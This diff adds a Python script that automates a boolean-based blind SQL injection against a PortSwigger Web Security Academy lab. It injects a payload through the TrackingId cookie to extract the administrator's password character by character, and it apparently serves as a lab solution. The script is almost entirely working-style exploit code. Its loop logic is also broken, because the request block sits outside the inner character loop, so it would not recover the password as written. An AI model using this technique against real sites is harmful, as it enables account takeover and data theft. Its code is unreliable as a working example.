@@ -1,0 +1,31 @@
+import requests # Import the requests module to send requests
+
+def blind_SQLi(): # Define the function
+    labID = 'LabID-HERE' # <<< Add Your lab ID here
+    url = f'https://{labID}.web-security-academy.net/filter?category=Pets' # The URL to send the request to.
+    data = list() # List to store the data found.
+    
+    for pos in range(1, 21): # Iterate over the password length.
+        for ascii_char in range(48,123): # Itrate over the ascii characters.
+            if ascii_char > 57 and ascii_char < 65 or ascii_char > 90 and ascii_char < 97: # Skip the special characters.
+                continue
+        # Convert the ascii to char.
+        char = chr(ascii_char)
+        
+        # Our payload.
+        payload = f"'AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}" 
+        header = { 
+            'Cookie':"TrackingId=abc" + payload # Adding the payload to the cookie.
+        }
+        
+        response = requests.get(url, headers=header) # Send GET request with our header
+        
+        if 'Welcome back!' in response.text: # Check if the response contains 'Welcome back!' message
+            data += char # Add the char to the data list.
+            print(f'Found so far! : {"".join(data)}') # Print the found data so far.
+            break
+        else:# If the char is not found.
+            print(f'Invalid: {char}') # Print the invalid char, I just like to see the process going.
+    
+    print(f'Password : {"".join(data)}') # Print the final password.
+blind_SQLi() # Call the function to start.
